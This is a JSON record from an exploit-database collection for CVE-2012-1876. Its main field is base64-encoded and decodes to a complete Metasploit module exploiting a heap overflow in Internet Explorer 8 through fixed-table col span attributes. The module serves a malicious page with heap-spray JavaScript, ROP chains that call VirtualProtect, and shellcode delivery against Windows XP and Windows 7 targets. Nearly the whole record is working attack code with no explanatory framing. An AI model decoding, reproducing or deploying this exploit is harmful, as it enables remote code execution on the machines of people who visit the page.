{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBmaWxlIGlzIHBhcnQgb2YgdGhlIE1ldGFzcGxvaXQgRnJhbWV3b3JrIGFuZCBtYXkgYmUgc3ViamVjdCB0bw0KIyByZWRpc3RyaWJ1dGlvbiBhbmQgY29tbWVyY2lhbCByZXN0cmljdGlvbnMuIFBsZWFzZSBzZWUgdGhlIE1ldGFzcGxvaXQNCiMgd2ViIHNpdGUgZm9yIG1vcmUgaW5mb3JtYXRpb24gb24gbGljZW5zaW5nIGFuZCB0ZXJtcyBvZiB1c2UuDQojICAgaHR0cDovL21ldGFzcGxvaXQuY29tLw0KIyMNCg0KcmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXQzIDwgTXNmOjpFeHBsb2l0OjpSZW1vdGUNCglSYW5rID0gTm9ybWFsUmFua2luZw0KDQoJaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcjo6SFRNTA0KCWluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6OkJyb3dzZXJBdXRvcHduDQoJYXV0b3B3bl9pbmZvKHsNCgkJOm9zX25hbWUgICAgPT4gT3BlcmF0aW5nU3lzdGVtczo6V0lORE9XUywNCgkJOnVhX21pbnZlciAgPT4gIjguMCIsDQoJCTp1YV9tYXh2ZXIgID0+ICI4LjAiLA0KCQk6cmFuayAgICAgICA9PiBOb3JtYWxSYW5raW5nLCAjIHJlbGlhYmxlIG1lbW9yeSBjb3JydXB0aW9uDQoJCTpqYXZhc2NyaXB0ID0+IHRydWUNCgl9KQ0KDQoJZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KCQlzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KCQkJJ05hbWUnICAgICAgICAgICA9PiAnTWljcm9zb2Z0IEludGVybmV0IEV4cGxvcmVyIEZpeGVkIFRhYmxlIENvbCBTcGFuIEhlYXAgT3ZlcmZsb3cnLA0KCQkJJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCgkJCQkJVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSBoZWFwIG92ZXJmbG93IHZ1bG5lcmFiaWxpdHkgaW4gSW50ZXJuZXQgRXhwbG9yZXIgY2F1c2VkDQoJCQkJYnkgYW4gaW5jb3JyZWN0IGhhbmRsaW5nIG9mIHRoZSBzcGFuIGF0dHJpYnV0ZSBmb3IgY29sIGVsZW1lbnRzIGZyb20gYSBmaXhlZCB0YWJsZSwNCgkJCQl3aGVuIHRoZXkgYXJlIG1vZGlmaWVkIGR5bmFtaWNhbGx5IGJ5IGphdmFzY3JpcHQgY29kZS4NCgkJCX0sDQoJCQknTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KCQkJJ0F1dGhvcicgICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJJ0FsZXhhbmRyZSBQZWxsZXRpZXInLCAgICAgICAgICAgICAgICAgICAgICMgVnVsbmVyYWJpbGl0eSBhbmFseXNpcw0KCQkJCQknbXJfbWUgPHN0ZXZlbnRob21hc3NlZWxleVthdF1nbWFpbC5jb20+JywgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCQknYmluam8nLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBNZXRhc3Bsb2l0IG1vZHVsZQ0KCQkJCQknc2lubjNyJywgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBIZWxwIHdpdGggdGhlIE1ldGFzcGxvaXQgbW9kdWxlDQoJCQkJCSdqdWFuJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIEhlbHAgd2l0aCB0aGUgTWV0YXNwbG9pdCBtb2R1bGUNCgkJCQldLA0KCQkJJ1JlZmVyZW5jZXMnICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQ1ZFJywgJzIwMTItMTg3NicgXSwNCgkJCQkJWyAnT1NWREInLCAnODI4NjYnXSwNCgkJCQkJWyAnQklEJywgJzUzODQ4JyBdLA0KCQkJCQlbICdNU0InLCAnTVMxMi0wMzcnIF0sDQoJCQkJCVsgJ1VSTCcsICdodHRwOi8vd3d3LnZ1cGVuLmNvbS9ibG9nLzIwMTIwNzEwLkFkdmFuY2VkX0V4cGxvaXRhdGlvbl9vZl9JbnRlcm5ldF9FeHBsb3Jlcl9IZWFwT3ZfQ1ZFLTIwMTItMTg3Ni5waHAnIF0NCgkJCQldLA0KCQkJJ0RlZmF1bHRPcHRpb25zJyA9Pg0KCQkJCXsNCgkJCQkJJ0VYSVRGVU5DJyA9PiAncHJvY2VzcycsDQoJCQkJCSdJbml0aWFsQXV0b1J1blNjcmlwdCcgPT4gJ21pZ3JhdGUgLWYnDQoJCQkJfSwNCgkJCSdQYXlsb2FkJyAgICAgICAgPT4NCgkJCQl7DQoJCQkJCSdTcGFjZScgICAgICAgICA9PiAxMDI0LA0KCQkJCQknQmFkQ2hhcnMnICAgICAgPT4gIlx4MDAiLA0KCQkJCX0sDQoJCQknUGxhdGZvcm0nICAgICAgID0+ICd3aW4nLA0KCQkJJ1RhcmdldHMnICAgICAgICA9Pg0KCQkJCVsNCgkJCQkJWyAnQXV0b21hdGljJywge30gXSwNCgkJCQkJWyAnSUUgOCBvbiBXaW5kb3dzIFhQIFNQMyB3aXRoIG1zdmNydCBST1AnLA0KCQkJCQkJew0KCQkJCQkJCSdSb3AnID0+IDptc3ZjcnQNCgkJCQkJCX0NCgkJCQkJXSwNCgkJCQkJWyAnSUUgOCBvbiBXaW5kb3dzIDcgU1AxJywNCgkJCQkJCXsNCgkJCQkJCQknUm9wJyA9PiA6anJlDQoJCQkJCQl9DQoJCQkJCV0NCgkJCQldLA0KCQkJJ1ByaXZpbGVnZWQnICAgICA9PiBmYWxzZSwNCgkJCSdEaXNjbG9zdXJlRGF0ZScgPT4gJ0p1biAxMiAyMDEyJywNCgkJCSdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCgkJCXJlZ2lzdGVyX29wdGlvbnMoDQoJCQkJWw0KCQkJCQlPcHRCb29sLm5ldygnT0JGVVNDQVRFJywgW2ZhbHNlLCAnRW5hYmxlIEphdmFTY3JpcHQgb2JmdXNjYXRpb24nLCBmYWxzZV0pDQoJCQkJXSwgc2VsZi5jbGFzcykNCgllbmQNCg0KCWRlZiBnZXRfdGFyZ2V0KGFnZW50KQ0KCQkjSWYgdGhlIHVzZXIgaXMgYWxyZWFkeSBzcGVjaWZpZWQgYnkgdGhlIHVzZXIsIHdlJ2xsIGp1c3QgdXNlIHRoYXQNCgkJcmV0dXJuIHRhcmdldCBpZiB0YXJnZXQubmFtZSAhPSAnQXV0b21hdGljJw0KDQoJCWlmIGFnZW50ID1+IC9OVCA1XC4xLyBhbmQgYWdlbnQgPX4gL01TSUUgOC8NCgkJCXJldHVybiB0YXJnZXRzWzFdICAjSUUgOCBvbiBXaW5kb3dzIFhQIFNQMw0KCQllbHNpZiBhZ2VudCA9fiAvTlQgNlwuMS8gYW5kIGFnZW50ID1+IC9NU0lFIDgvDQoJCQlyZXR1cm4gdGFyZ2V0c1syXSAgI0lFIDggb24gV2luZG93cyA3IHdpdGggSlJFDQoJCWVsc2UNCgkJCXJldHVybiBuaWwNCgkJZW5kDQoJZW5kDQoNCglkZWYganVuayhuPTQpDQoJCXJldHVybiByYW5kX3RleHRfYWxwaGEobikudW5wYWNrKCJWIikuZmlyc3QNCgllbmQNCg0KCWRlZiBub3ANCgkJcmV0dXJuIG1ha2Vfbm9wcyg0KS51bnBhY2soIlYiKS5maXJzdA0KCWVuZA0KDQoJZGVmIGdldF9wYXlsb2FkKHQpDQoNCgkJY29kZSA9IHBheWxvYWQuZW5jb2RlZA0KDQoJCSMgQm90aCBST1AgY2hhaW5zIGdlbmVyYXRlZCBieSBtb25hLnB5IC0gU2VlIGNvcmVsYW4uYmUNCgkJY2FzZSB0WydSb3AnXQ0KCQkJd2hlbiA6bXN2Y3J0DQoJCQkJcHJpbnRfc3RhdHVzKCJVc2luZyBtc3ZjcnQgUk9QIikNCgkJCQlleGVjX3NpemUgPSBjb2RlLmxlbmd0aA0KCQkJCXJvcCA9DQoJCQkJCVsNCgkJCQkJCTB4NzdjNGVjMDEsICMgcmV0bg0KCQkJCQkJMHg3N2M0ZWMwMCwgIyBwb3AgZWJwOyByZXRuDQoJCQkJCQkweDc3YzE1ZWQ1LCAjIHhjaGcgZWF4LGVzcDsgcmV0biAocGl2b3QpDQoJCQkJCQkweDc3YzRlMzkyLCAjIHBvcCBlYXg7IHJldG4NCgkJCQkJCTB4NzdjMTExMjAsICMgPC0gKiZWaXJ0dWFsUHJvdGVjdCgpDQoJCQkJCQkweDc3YzJlNDkzLCAjIG1vdiBlYXgsIGR3b3JkIHB0ciBkczpbZWF4XTsgcG9wIGVicDsgcmV0bg0KCQkJCQkJanVuaywNCgkJCQkJCTB4NzdjMmRkNmMsDQoJCQkJCQkweDc3YzRlYzAwLCAjIHBvcCBlYnA7IHJldG4NCgkJCQkJCTB4NzdjMzU0NTksICMgcHRyIHRvICdwdXNoIGVzcDsgcmV0Jw0KCQkJCQkJMHg3N2M0NzcwNSwgIyBwb3AgZWJ4OyByZXRuDQoJCQkJCQlleGVjX3NpemUsICAjIGVieA0KCQkJCQkJMHg3N2MzZWEwMSwgIyBwb3AgZWN4OyByZXRuDQoJCQkJCQkweDc3YzVkMDAwLCAjIFcgcG9pbnRlciAobHBPbGRQcm90ZWN0KSAoLT4gZWN4KQ0KCQkJCQkJMHg3N2M0NjEwMCwgIyBwb3AgZWRpOyByZXRuDQoJCQkJCQkweDc3YzQ2MTAxLCAjIHJvcCBub3AgKC0+IGVkaSkNCgkJCQkJCTB4NzdjNGQ2ODAsICMgcG9wIGVkeDsgcmV0bg0KCQkJCQkJMHgwMDAwMDA0MCwgIyBuZXdQcm90ZWN0ICgweDQwKSAoLT4gZWR4KQ0KCQkJCQkJMHg3N2M0ZTM5MiwgIyBwb3AgZWF4OyByZXRuDQoJCQkJCQlub3AsICAgICAgICAjIG5vcHMgKC0+IGVheCkNCgkJCQkJCTB4NzdjMTJkZjkgICMgcHVzaGFkOyByZXRuDQoJCQkJCV0ucGFjaygiVioiKQ0KCQkJd2hlbiA6anJlDQoJCQkJcHJpbnRfc3RhdHVzKCJVc2luZyBKUkUgUk9QIikNCgkJCQlleGVjX3NpemUgPSBjb2RlLmxlbmd0aA0KCQkJCXJvcCA9DQoJCQkJCVsNCgkJCQkJCTB4N2MzNDZjMGIsICMgcmV0bg0KCQkJCQkJMHg3YzM2Zjk3MCwgIyBwb3AgZWJwOyByZXRuDQoJCQkJCQkweDdjMzQ4YjA1LCAjIHhjaGcgZWF4LGVzcDsgcmV0biAocGl2b3QpDQoJCQkJCQkweDdjMzZmOTcwLCAjIHBvcCBlYnA7IHJldG4gW01TVkNSNzEuZGxsXQ0KCQkJCQkJMHg3YzM2Zjk3MCwgIyBza2lwIDQgYnl0ZXMgW01TVkNSNzEuZGxsXQ0KCQkJCQkJMHg3YzM0MzczYSwgIyBwb3AgZWJ4IDsgcmV0biBbTVNWQ1I3MS5kbGxdDQoJCQkJCQlleGVjX3NpemUsICAjIGVieA0KCQkJCQkJMHg3YzM0NDRkMCwgIyBwb3AgZWR4IDsgcmV0biBbTVNWQ1I3MS5kbGxdDQoJCQkJCQkweDAwMDAwMDQwLCAjIDB4MDAwMDAwNDAtPiBlZHgNCgkJCQkJCTB4N2MzNjE4MjksICMgcG9wIGVjeCA7IHJldG4gW01TVkNSNzEuZGxsXQ0KCQkJCQkJMHg3YzM4ZjAzNiwgIyAmV3JpdGFibGUgbG9jYXRpb24gW01TVkNSNzEuZGxsXQ0KCQkJCQkJMHg3YzM0Mjc2NiwgIyBwb3AgZWRpIDsgcmV0biBbTVNWQ1I3MS5kbGxdDQoJCQkJCQkweDdjMzQ2YzBiLCAjIHJldG4gKHJvcCBub3ApIFtNU1ZDUjcxLmRsbF0NCgkJCQkJCTB4N2MzNTA1NjQsICMgcG9wIGVzaSA7IHJldG4gW01TVkNSNzEuZGxsXQ0KCQkJCQkJMHg3YzM0MTVhMiwgIyBqbXAgW2VheF0gW01TVkNSNzEuZGxsXQ0KCQkJCQkJMHg3YzM3NjZmZiwgIyBwb3AgZWF4IDsgcmV0biBbTVNWQ1I3MS5kbGxdDQoJCQkJCQkweDdjMzdhMTUxLCAjIHB0ciB0byAmVmlydHVhbFByb3RlY3QoKSAtIDB4MGVmIFtJQVQgbXN2Y3I3MS5kbGxdDQoJCQkJCQkweDdjMzc4YzgxLCAjIHB1c2hhZCAjIGFkZCBhbCwwZWYgOyByZXRuIFtNU1ZDUjcxLmRsbF0NCgkJCQkJCTB4N2MzNDVjMzAgICMgcHRyIHRvICdwdXNoIGVzcDsgcmV0ICcgW01TVkNSNzEuZGxsXQ0KCQkJCQldLnBhY2soIlYqIikNCgkJZW5kDQoNCgkJY29kZSA9IHJvcCArIGNvZGUNCgkJcmV0dXJuIGNvZGUNCgllbmQNCg0KCWRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcXVlc3QpDQoNCgkJYWdlbnQgPSByZXF1ZXN0LmhlYWRlcnNbJ1VzZXItQWdlbnQnXQ0KCQlteV90YXJnZXQgPSBnZXRfdGFyZ2V0KGFnZW50KQ0KDQoJCSMgQXZvaWQgdGhlIGF0dGFjayBpZiB0aGUgdmljdGltIGRvZXNuJ3QgaGF2ZSB0aGUgc2FtZSBzZXR1cCB3ZSdyZSB0YXJnZXRpbmcNCgkJaWYgbXlfdGFyZ2V0Lm5pbD8NCgkJCXByaW50X2Vycm9yKCJCcm93c2VyIG5vdCBzdXBwb3J0ZWQ6ICN7YWdlbnR9IikNCgkJCXNlbmRfbm90X2ZvdW5kKGNsaSkNCgkJCXJldHVybg0KCQllbmQNCg0KCQlqc19jb2RlID0gIFJleDo6VGV4dC50b191bmVzY2FwZShnZXRfcGF5bG9hZChteV90YXJnZXQpLCBSZXg6OkFyY2guZW5kaWFuKHRhcmdldC5hcmNoKSkNCg0KCQl0YWJsZV9idWlsZGVyID0gJycNCg0KCQkwLnVwdG8oMTMyKSBkbyB8aXwNCgkJCXRhYmxlX2J1aWxkZXIgPDwgIjx0YWJsZSBzdHlsZT1cInRhYmxlLWxheW91dDpmaXhlZFwiID48Y29sIGlkPVwiI3tpfVwiIHdpZHRoPVwiNDFcIiBzcGFuPVwiOVwiID4mbmJzcCA8L2NvbD48L3RhYmxlPiINCgkJZW5kDQoNCgkJIyBBYm91dCBzbWFzaF92dGFibGUoKToNCgkJIyAqIHNtYXNoIHRoZSB2ZnRhYmxlIDB4MDcwNzAwMjQNCgkJIyAqIHNwYW4gPT4gdGhlIGFtb3VudCB0byBvdmVyd3JpdGUNCgkJanNfZWxlbWVudF9pZCA9IFJleDo6VGV4dC5yYW5kX3RleHRfYWxwaGEoNCkNCgkJc3ByYXlfdHJpZ2dlcl9qcyA9IDw8LUpTDQoNCgkJdmFyIGRhcCA9ICJFRUVFIjsNCgkJd2hpbGUgKCBkYXAubGVuZ3RoIDwgNDgwICkgZGFwICs9IGRhcDsNCg0KCQl2YXIgcGFkZGluZyA9ICJBQUFBIjsNCgkJd2hpbGUgKCBwYWRkaW5nLmxlbmd0aCA8IDQ4MCApIHBhZGRpbmcgKz0gcGFkZGluZzsNCg0KCQl2YXIgZmlsbGVyID0gIkJCQkIiOw0KCQl3aGlsZSAoIGZpbGxlci5sZW5ndGggPCA0ODAgKSBmaWxsZXIgKz0gZmlsbGVyOw0KDQoJCXZhciBhcnIgPSBuZXcgQXJyYXkoKTsNCgkJdmFyIHJyYSA9IG5ldyBBcnJheSgpOw0KDQoJCXZhciBkaXZfY29udGFpbmVyID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIiN7anNfZWxlbWVudF9pZH0iKTsNCgkJZGl2X2NvbnRhaW5lci5zdHlsZS5jc3NUZXh0ID0gImRpc3BsYXk6bm9uZSI7DQoNCgkJZm9yICh2YXIgaT0wOyBpIDwgNTAwOyBpKz0yKSB7DQoJCQlycmFbaV0gPSBkYXAuc3Vic3RyaW5nKDAsICgweDEwMC02KS8yKTsNCgkJCWFycltpXSA9IHBhZGRpbmcuc3Vic3RyaW5nKDAsICgweDEwMC02KS8yKTsNCgkJCWFycltpKzFdID0gZmlsbGVyLnN1YnN0cmluZygwLCAoMHgxMDAtNikvMik7DQoJCQl2YXIgb2JqID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiYnV0dG9uIik7DQoJCQlkaXZfY29udGFpbmVyLmFwcGVuZENoaWxkKG9iaik7DQoJCX0NCg0KCQlmb3IgKHZhciBpPTIwMDsgaTw1MDA7IGkrPTIgKSB7DQoJCQlycmFbaV0gPSBudWxsOw0KCQkJQ29sbGVjdEdhcmJhZ2UoKTsNCgkJfQ0KDQoJCWZ1bmN0aW9uIGhlYXBfc3ByYXkoKXsNCgkJCUNvbGxlY3RHYXJiYWdlKCk7DQoNCgkJCXZhciBzaGVsbGNvZGUgPSB1bmVzY2FwZSgiI3tqc19jb2RlfSIpOw0KDQoJCQl3aGlsZSAoc2hlbGxjb2RlLmxlbmd0aCA8IDEwMDAwMCkNCgkJCXNoZWxsY29kZSA9IHNoZWxsY29kZSArIHNoZWxsY29kZTsNCgkJCXZhciBvbmVtZWcgPSBzaGVsbGNvZGUuc3Vic3RyKDAsIDY0KjEwMjQvMik7DQoJCQlmb3IgKGk9MDsgaTwxNDsgaSsrKSB7DQoJCQkJb25lbWVnICs9IHNoZWxsY29kZS5zdWJzdHIoMCwgNjQqMTAyNC8yKTsNCgkJCX0NCg0KCQkJb25lbWVnICs9IHNoZWxsY29kZS5zdWJzdHIoMCwgKDY0KjEwMjQvMiktKDM4LzIpKTsNCgkJCXZhciBzcHJheSA9IG5ldyBBcnJheSgpOw0KDQoJCQlmb3IgKGk9MDsgaTw0MDA7IGkrKykgew0KCQkJCXNwcmF5W2ldID0gb25lbWVnLnN1YnN0cigwLCBvbmVtZWcubGVuZ3RoKTsNCgkJCX0NCgkJfQ0KDQoJCWZ1bmN0aW9uIHNtYXNoX3Z0YWJsZSgpew0KCQkJdmFyIG9ial9jb2xfMCA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCIxMzIiKTsNCgkJCW9ial9jb2xfMC53aWR0aCA9ICIxMTc4OTkzIjsNCgkJCW9ial9jb2xfMC5zcGFuID0gIjQ0IjsNCgkJfQ0KDQoJCXNldFRpbWVvdXQoZnVuY3Rpb24oKXtoZWFwX3NwcmF5KCl9LCA0MDApOw0KCQlzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7c21hc2hfdnRhYmxlKCl9LCA3MDApOw0KCQlKUw0KDQoJCWlmIGRhdGFzdG9yZVsnT0JGVVNDQVRFJ10NCgkJCXNwcmF5X3RyaWdnZXJfanMgPSA6OlJleDo6RXhwbG9pdGF0aW9uOjpKU09iZnUubmV3KHNwcmF5X3RyaWdnZXJfanMpDQoJCQlzcHJheV90cmlnZ2VyX2pzLm9iZnVzY2F0ZQ0KCQllbmQNCg0KCQkjIGJ1aWxkIGh0bWwNCgkJY29udGVudCA9IDw8LUhUTUwNCgkJPGh0bWw+DQoJCTxib2R5Pg0KCQk8ZGl2IGlkPSIje2pzX2VsZW1lbnRfaWR9Ij48L2Rpdj4NCgkJI3t0YWJsZV9idWlsZGVyfQ0KCQk8c2NyaXB0IGxhbmd1YWdlPSdqYXZhc2NyaXB0Jz4NCgkJI3tzcHJheV90cmlnZ2VyX2pzfQ0KCQk8L3NjcmlwdD4NCgkJPC9ib2R5Pg0KCQk8L2h0bWw+DQoJCUhUTUwNCg0KCQlwcmludF9zdGF0dXMoIlNlbmRpbmcgZXhwbG9pdCB0byAje2NsaS5wZWVyaG9zdH06I3tjbGkucGVlcnBvcnR9Li4uIikNCg0KCQkjIFRyYW5zbWl0IHRoZSByZXNwb25zZSB0byB0aGUgY2xpZW50DQoJCXNlbmRfcmVzcG9uc2VfaHRtbChjbGksIGNvbnRlbnQpDQoJZW5kDQoNCmVuZA==", 
    "filename": "platforms/windows/remote/20174.rb", 
    "id": "20174", 
    "cves": [
        "CVE-2012-1876"
    ]
}